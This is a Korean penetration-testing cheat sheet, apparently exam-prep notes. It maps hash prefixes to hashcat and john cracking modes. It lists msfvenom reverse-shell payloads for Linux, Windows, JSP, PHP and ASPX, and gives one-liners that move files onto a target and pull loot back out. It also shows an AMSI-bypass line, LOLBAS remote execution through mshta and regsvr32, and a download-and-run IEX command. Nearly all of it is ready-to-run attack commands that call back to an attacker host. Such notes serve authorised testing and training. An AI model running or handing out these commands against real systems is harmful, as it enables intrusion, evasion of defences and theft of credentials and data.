# 09. 크랙 · 페이로드 · 전송 (교차 참조)

여러 상황에서 반복되는 유틸. 셸 잡은 뒤·크리덴셜 잡은 뒤 여기서 찾는다. `$T`·`$LHOST`=[[00. START]].

## 1. 해시 → 크랙 모드 (제일 자주 헷갈림)

**프리픽스로 종류 판별** → hashcat `-m` 또는 john `--format`.
```
hashid '해시'          # 종류 모르면 (또는 hash-identifier)
```
| 해시/출처 | 프리픽스·형태 | hashcat -m | john --format |
|---|---|---|---|
| MD5 | 32 hex | 0 | raw-md5 |
| SHA1 | 40 hex | 100 | raw-sha1 |
| NTLM (SAM·secretsdump) | 32 hex (LM:NT) | 1000 | nt |
| NetNTLMv2 (Responder·smbserver) | `u::DOM:...` | 5600 | netntlmv2 |
| NetNTLMv1 | | 5500 | netntlm |
| Kerberoast (TGS) | `$krb5tgs$23$` | 13100 | krb5tgs |
| AS-REP roast | `$krb5asrep$23$` | 18200 | krb5asrep |
| md5crypt `/etc/shadow` | `$1$` | 500 | md5crypt |
| sha512crypt `/etc/shadow` | `$6$` | 1800 | sha512crypt |
| bcrypt | `$2a$/$2b$/$2y$` | 3200 | bcrypt |
| **yescrypt** `/etc/shadow` | `$y$` | (버전의존, ⚠️) | **john이 확실** |
| JWT HS256 | `xxx.yyy.zzz` | 16500 | (jwt) |
| NetNTLM 도메인캐시 | `$DCC2$` | 2100 | mscash2 |
| KeePass | `.kdbx` → keepass2john | 13400 | keepass |
| ZIP | zip2john | 13600 | zip |
| RAR | rar2john | (13000류) | rar |
| SSH 키 | ssh2john | 22921류 | ssh |
| PDF | pdf2john | 10500류 | pdf |
```bash
hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt              # MODE=위 표의 번호
hashcat -m MODE hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # 룰
john --format=FORMAT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john hash.txt --show      # 결과 다시 보기
# 파일→john 변환기: keepass2john · zip2john · ssh2john · rar2john · pdf2john · gpg2john
```

## 2. msfvenom 페이로드 (플랫폼·포맷별)

```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o r.elf
# Windows (stageless = nc로 받힘)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o r.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o r.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o r.msi
# 웹셸 (앱 서버별)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o r.war    # Tomcat
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o r.php               # PHP
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o r.aspx  # IIS
# 셸코드 (버퍼오버플로우 등)
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f c -b "\x00\x0a\x0d"
```
- **stageless(`shell_reverse_tcp`)만 nc로 받힌다.** `meterpreter`·staged(`/shell/`)는 msf multi/handler 필요(시험 1대 한정)
- 리스너: `rlwrap nc -lvnp $LPORT` (stageless) / `msfconsole -q -x "use multi/handler;..."` (staged)

## 3. 파일 전송 총람 (Kali → 타겟)

Kali 서빙: `python3 -m http.server 80` (또는 `impacket-smbserver share . -smb2support`)
```bash
# 리눅스 타겟 (하나씩 시도)
wget http://$LHOST/f -O /tmp/f    ||    curl http://$LHOST/f -o /tmp/f
# curl/wget 둘 다 없으면:
exec 3<>/dev/tcp/$LHOST/80; echo -e "GET /f HTTP/1.0\n" >&3; cat <&3 > /tmp/f
scp user@$LHOST:/f /tmp/f          # SSH 되면
```
```powershell
# Windows 타겟
iwr http://$LHOST/f.exe -o C:\Windows\Temp\f.exe          # PowerShell
certutil -urlcache -f http://$LHOST/f.exe C:\Windows\Temp\f.exe   # certutil (구형에도)
copy \\$LHOST\share\f.exe C:\Windows\Temp\               # SMB
bitsadmin /transfer j http://$LHOST/f.exe C:\Windows\Temp\f.exe
```
```
# HTTP·SMB 다 막혔을 때 최후수단 — base64 콘솔 붙여넣기
Kali:   base64 -w0 f.exe
Linux:  echo <BASE64> | base64 -d > /tmp/f
Win:    [IO.File]::WriteAllBytes("C:\Windows\Temp\f.exe",[Convert]::FromBase64String("<BASE64>"))
```
**타겟 → Kali (회수)**: Kali `nc -lvnp 443 > loot` ↔ 타겟 `nc $LHOST 443 < file` · 또는 `curl -T file http://$LHOST/`(업로드 서버) · smbserver put.

## 4. AV / AMSI / Defender 우회

```powershell
# AMSI 우회 (PowerShell 스크립트가 잡힐 때) — 세션에서 먼저 실행
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
# 파일 안 떨구는 리버스셸 (revshells.com "PowerShell #3 (Base64)")
powershell -e <BASE64>
```
- **msfvenom exe는 거의 다 잡힘** → ① 순수 PS 리버스셸(파일 없음) ② nishang `Invoke-PowerShellTcp` ③ C# 로더
- **LOLBAS** (서명된 정상 바이너리로 다운로드·실행, AV 통과 잘 됨):
  `certutil`·`mshta http://$LHOST/x.hta`·`regsvr32 /s /u /i:http://$LHOST/x.sct scrobj.dll`·`rundll32`
- 인코딩 여러 겹: `msfvenom ... -e x64/xor_dynamic -i 5` (요즘 AV엔 약함, 최후)
- **웹셸이 잡히면** 확장자·매직바이트 우회 → [[08. 웹 공격]] 2절

## 5. 셸 안정화 (플랫폼별)

```bash
# 리눅스
python3 -c 'import pty;pty.spawn("/bin/bash")'   # 없으면 script -qc /bin/bash /dev/null
# Ctrl+Z → stty raw -echo; fg → Enter 2번 → export TERM=xterm
```
```
# Windows — nc 셸은 불안정. 안정 셸로:
- evil-winrm (자격증명·해시 있으면 제일 안정)
- ConPtyShell (진짜 TTY): powershell IEX(IWR http://$LHOST/Invoke-ConPtyShell.ps1 -UseB); Invoke-ConPtyShell $LHOST $LPORT
- RunasCs / 새 세션
```
